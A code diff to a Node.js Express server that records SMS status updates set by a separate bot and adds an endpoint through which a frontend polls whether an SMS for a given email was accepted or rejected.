@@ -566,6 +566,13 @@ app.post("/update-status", (req, res) => {
       return res.json({ ok: true });
     }
 
+    // ✅ NEW: Handle SMS status updates
+    if (pendingSMS[identifier]) {
+      pendingSMS[identifier].status = status;
+      console.log(`✅ Updated pendingSMS[${identifier}].status = ${status}`);
+      return res.json({ ok: true });
+    }
+
     if (!pendingApprovals[identifier]) {
       pendingApprovals[identifier] = {};
     }
@@ -666,6 +673,55 @@ app.post("/verify-sms", async (req, res) => {
 
   } catch (err) {
     res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
+// POST /check-sms-status - Check if SMS was accepted or rejected
+// ============================================================================
+
+app.post("/check-sms-status", (req, res) => {
+  try {
+    const { email } = req.body;
+
+    if (!email) {
+      return res.json({ status: "pending" });
+    }
+
+    // Check pendingSMS first
+    if (pendingSMS[email]) {
+      const smsStatus = pendingSMS[email].status;
+      console.log(`✅ SMS status for ${email}: ${smsStatus}`);
+      
+      // Map bot.js status values to frontend expectations
+      if (smsStatus === "sms_accept") {
+        return res.json({ status: "sms_accepted" });
+      } else if (smsStatus === "sms_reject") {
+        return res.json({ status: "sms_rejected" });
+      }
+      
+      return res.json({ status: smsStatus || "pending" });
+    }
+
+    // Check pendingApprovals as fallback
+    if (pendingApprovals[email]) {
+      const approvalStatus = pendingApprovals[email].status;
+      console.log(`✅ Approval status for ${email}: ${approvalStatus}`);
+      
+      if (approvalStatus === "sms_accept") {
+        return res.json({ status: "sms_accepted" });
+      } else if (approvalStatus === "sms_reject") {
+        return res.json({ status: "sms_rejected" });
+      }
+      
+      return res.json({ status: approvalStatus || "pending" });
+    }
+
+    res.json({ status: "pending" });
+
+  } catch (err) {
+    console.error("Check SMS status error:", err);
+    res.status(500).json({ error: "Internal server error" });
   }
 });
 
